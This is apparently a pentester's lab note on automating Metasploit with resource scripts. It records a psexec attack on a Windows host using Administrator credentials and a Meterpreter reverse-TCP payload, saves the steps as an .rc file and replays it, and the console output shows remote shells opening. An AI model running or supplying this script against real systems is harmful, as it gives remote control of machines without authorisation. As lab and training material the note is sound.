- Resource scripts provide an easy way for us to automate repetitive tasks in Metasploit.

## You can find resource scripts there -> "/usr/share/metasploit-framework/scripts/resource/"
```python
┌──(hyok㉿kali)-[~]
└─$ ls /usr/share/metasploit-framework/scripts/resource/
auto_brute.rc               bap_all.rc           dev_checks.rc                 oracle_login.rc  smb_checks.rc
autocrawler.rc              bap_dryrun_only.rc   fileformat_generator.rc       oracle_sids.rc   smb_validate.rc
auto_cred_checker.rc        bap_firefox_only.rc  meterpreter_compatibility.rc  oracle_tns.rc    wmap_autotest.rc
autoexploit.rc              bap_flash_only.rc    mssql_brute.rc                port_cleaner.rc
auto_pass_the_hash.rc       bap_ie_only.rc       multi_post.rc                 portscan.rc
auto_win32_multihandler.rc  basic_discovery.rc   nessus_vulns_cleaner.rc       run_all_post.rc
```

## Creating our own resource script
```python
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.216.11
RHOST => 192.168.216.11
msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.216.11
[*] Meterpreter session 1 opened (192.168.216.9:4444 -> 192.168.216.11:49387) at 2023-03-12 12:55:44 +0530

meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y
msf6 exploit(windows/smb/psexec) > makerc /root/psexec.rc
[*] Saving last 6 commands to /root/psexec.rc ...
```

## The resulting resource script contains the following:
```python
┌──(hyok㉿kali)-[~]
└─$ sudo cat /root/psexec.rc
[sudo] password for hyok: 
use exploit/windows/smb/psexec
set RHOST 192.168.216.11
set SMBUSER Administrator
set SMBPASS vagrant
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

## To run a resource script when launching msfconsole, use the -r option followed by the path to the resource script
```python
┌──(root㉿kali)-[/home/hyok]
└─# msfconsole -q -r /root/psexec.rc 
[*] Processing /root/psexec.rc for ERB directives.
resource (/root/psexec.rc)> use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
resource (/root/psexec.rc)> set RHOST 192.168.216.11
RHOST => 192.168.216.11
resource (/root/psexec.rc)> set SMBUSER Administrator
SMBUSER => Administrator
resource (/root/psexec.rc)> set SMBPASS vagrant
SMBPASS => vagrant
resource (/root/psexec.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/psexec.rc)> exploit
[*] Started reverse TCP handler on 192.168.216.9:4444 
[*] 192.168.216.11:445 - Connecting to the server...
[*] 192.168.216.11:445 - Authenticating to 192.168.216.11:445 as user 'Administrator'...
[*] 192.168.216.11:445 - Selecting PowerShell target
[*] 192.168.216.11:445 - Executing the payload...
[+] 192.168.216.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.216.11
[*] Meterpreter session 1 opened (192.168.216.9:4444 -> 192.168.216.11:49278) at 2023-03-12 14:33:42 +0530

meterpreter > 
```